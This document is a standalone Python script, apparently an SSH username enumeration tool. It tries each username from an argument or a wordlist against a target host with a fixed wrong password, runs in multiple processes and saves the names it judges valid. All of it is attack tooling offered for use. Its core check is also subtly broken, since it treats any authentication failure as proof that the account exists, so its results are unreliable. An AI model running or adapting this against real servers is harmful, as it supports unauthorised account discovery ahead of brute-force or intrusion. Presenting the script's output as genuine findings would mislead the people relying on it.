#!/usr/bin/env python3
import argparse
import socket
import sys
import logging
import multiprocessing
import paramiko
import time

def checkUsername(username):
    """
    Check if a username is valid by attempting SSH authentication
    """
    try:
        # Create SSH client
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # Try to connect with a wrong password to check user existence
        try:
            ssh.connect(
                hostname=args.hostname,
                port=args.port,
                username=username,
                password='wrong_password_12345',
                timeout=10,
                allow_agent=False,
                look_for_keys=False
            )
        except paramiko.ssh_exception.AuthenticationException:
            # Authentication exception usually means the user exists but password is wrong
            return (username, True)
        except paramiko.ssh_exception.BadAuthenticationType:
            # Bad auth type might also indicate user exists
            return (username, True)
        except paramiko.ssh_exception.SSHException as e:
            if "Authentication failed" in str(e):
                return (username, True)
            else:
                return (username, False)
        except Exception as e:
            # Other exceptions (connection refused, timeout, etc.)
            return (username, False)
        finally:
            ssh.close()
            
    except Exception as e:
        return (username, False)
    
    return (username, False)
# get rid of paramiko logging
logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

arg_parser = argparse.ArgumentParser(description='SSH Username Enumeration Tool')
arg_parser.add_argument('hostname', type=str, help="The target hostname or ip address")
arg_parser.add_argument('--port', type=int, default=22, help="The target port")
arg_parser.add_argument('--threads', type=int, default=5, help="The number of threads to be used")
arg_parser.add_argument('--outputFile', type=str, help="The output file location")
arg_parser.add_argument('--outputFormat', choices=['list', 'json', 'csv'], default='list', type=str, help="The output format")
group = arg_parser.add_mutually_exclusive_group(required=True)
group.add_argument('--username', type=str, help="The single username to validate")
group.add_argument('--userList', type=str, help="The list of usernames (one per line) to enumerate through")
args = arg_parser.parse_args()

# Test connection
sock = socket.socket()
try:
    sock.connect((args.hostname, args.port))
    sock.close()
    print(f"[+] Successfully connected to {args.hostname}:{args.port}")
except socket.error:
    print('[-] Connecting to host failed. Please check the specified host and port.')
    sys.exit(1)

if args.username:  # single username passed in
    result = checkUsername(args.username)
    if result[1]:
        print(result[0] + " is a valid user!")
    else:
        print(result[0] + " is not a valid user!")
elif args.userList:  # username list passed in
    try:
        with open(args.userList, 'r') as f:
            usernames = [line.strip() for line in f.readlines() if line.strip()]
    except IOError:
        print("[-] File doesn't exist or is unreadable.")
        sys.exit(3)
    
    print(f"[*] Testing {len(usernames)} usernames with {args.threads} threads...")
    
    # map usernames to their respective threads
    pool = multiprocessing.Pool(args.threads)
    results = pool.map(checkUsername, usernames)
    
    # Process results
    valid_users = [result[0] for result in results if result[1]]
    
    if args.outputFile:
        try:
            with open(args.outputFile, "w") as outputFile:
                if args.outputFormat == 'list':
                    for user in valid_users:
                        outputFile.write(user + '\n')
                elif args.outputFormat == 'json':
                    import json
                    json.dump(valid_users, outputFile, indent=2)
                elif args.outputFormat == 'csv':
                    import csv
                    writer = csv.writer(outputFile)
                    writer.writerow(['Username'])
                    for user in valid_users:
                        writer.writerow([user])
            print(f"[+] Results written to {args.outputFile}")
        except IOError:
            print("[-] Could not open output file for writing.")
            sys.exit(4)
    
    # Print results to console
    print(f"\n[+] Found {len(valid_users)} valid users:")
    for user in valid_users:
        print(f"  [+] {user}")
    
    pool.close()
    pool.join()